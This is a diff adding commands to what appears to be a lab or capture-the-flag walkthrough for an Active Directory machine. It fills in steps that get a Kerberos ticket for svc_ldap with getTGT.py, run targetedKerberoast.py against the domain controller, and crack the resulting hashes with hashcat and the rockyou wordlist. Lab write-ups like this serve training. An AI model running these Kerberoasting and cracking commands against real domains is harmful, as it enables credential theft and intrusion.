@@ -58,16 +58,18 @@
 
 7. First, get TGT for svc_ldap using impacket's getTGT.py script and set KRB5CCNAME environment variable to use the ccache file.
 
+`getTGT.py -k -dc-ip dc.voleur.htb voleur.htb/svc_ldap:'[PASSWORD]'`
+
 ![image](https://github.com/user-attachments/assets/7341c702-d2a8-43d7-91b4-736c41cfc8e0)
 
 8. Now run targetedKerberoast.py with kerberos authentication
 
-``
+`targetedKerberoast.py -k --dc-ip 10.129.61.59 --dc-host dc.voleur.htb -v -d voleur.htb`
 
 ![image](https://github.com/user-attachments/assets/b86fc911-0c80-4d28-9d3e-08694c182c9a)
 
 9. Crack hash offline using hashcat
 
-``
+`hashcat -m 13100 targetedKerberoast.txt /usr/share/wordlists/rockyou.txt`
 
 10. 
